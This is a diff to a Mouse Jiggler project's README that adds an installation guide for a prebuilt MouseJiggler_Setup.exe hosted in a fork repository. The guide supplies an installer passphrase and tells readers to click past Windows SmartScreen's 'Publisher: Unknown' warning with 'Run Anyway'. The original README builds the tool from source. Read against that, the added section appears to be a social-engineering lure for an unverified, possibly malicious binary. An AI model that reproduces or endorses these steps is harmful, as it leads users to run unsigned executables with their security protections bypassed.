@@ -70,6 +70,46 @@ dotnet build MouseJiggler\MouseJiggler.csproj -c Release
 
 Open `MouseJiggler\MouseJiggler.sln` and build the solution.
 
+## 📥 Installation Guide
+
+Get up and running with Mouse Jiggler in just a few clicks!
+
+### Step 1: Download the Installer
+Click the badge below to jump directly to our latest official stable deployment pipeline and grab the setup file:
+
+[![Download Mouse Jiggler](https://img.shields.io/badge/Download-Latest%20__Setup.exe-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Neutron-0/Mouse-jiggler/releases/latest)
+
+*(Alternatively, navigate to the **[Releases](https://github.com/Neutron-0/Mouse-jiggler/releases)** sidebar layout on the right side of this repository page and select `MouseJiggler_Setup.exe` from the assets container.)*
+
+---
+
+### Step 2: Run the Setup Wizard
+1. Locate the downloaded **`MouseJiggler_Setup.exe`** file on your computer and double-click it to launch.
+2. Enter the installation passphrase when prompted: **`Neutron-0`**
+3. Follow the clean, modern dark setup installation wizard instructions.
+4. *(Optional)* Check the box to generate a **Desktop Shortcut** for rapid system access.
+
+> ⚠️ **Note on Windows SmartScreen / UAC:** 
+> Because this is an independent, open-source portfolio utility, the installer binary is not digitally signed with a commercial Windows Developer Certificate. When launching the installer, Windows may display a **"Publisher: Unknown"** security notification. You can safely click **"More Info"** and then select **"Run Anyway"** to proceed with the native installation.
+
+---
+
+### Step 3: Run the Application
+Once the setup finishes, launch the software using your new Start Menu entry or Desktop shortcut.
+
+* Use the global hotkey shortcut **`Ctrl+Shift+J`** to toggle mouse simulation states cleanly.
+* Minimize the control dashboard interface directly to your system tray boundary layer to keep it running silently in the background.
+
+## Known Issues
+
+This project has been reviewed for common runtime and UX issues. The following potential bugs and limitations were identified:
+
+- The global hotkey is currently hard-coded to **Ctrl+Shift+J**. If another application already uses this shortcut, hotkey registration may fail and the toggle shortcut will not work.
+- `Zen` mode may not reliably prevent idle detection in every Windows environment or in all applications. It is a best-effort mode that may fail under some screen saver or idle-monitoring implementations.
+- The application is built as a framework-dependent executable (`SelfContained=false`), so the target machine must have the correct .NET 10 runtime installed for the release build to launch.
+- The UI currently persists the `RespectLockedState` setting in user settings, but the corresponding control may not be visible or available in every build configuration, making it harder to change that behavior from the app.
+- Invalid or corrupted `MouseJiggler.dll.config` content will prevent startup entirely. The installer should preserve the runtime configuration file and avoid manual edits to it.
+
 ## Project Audit: Past Author References
 
 A scan of the active source and project file identified legacy attribution references from the original project.
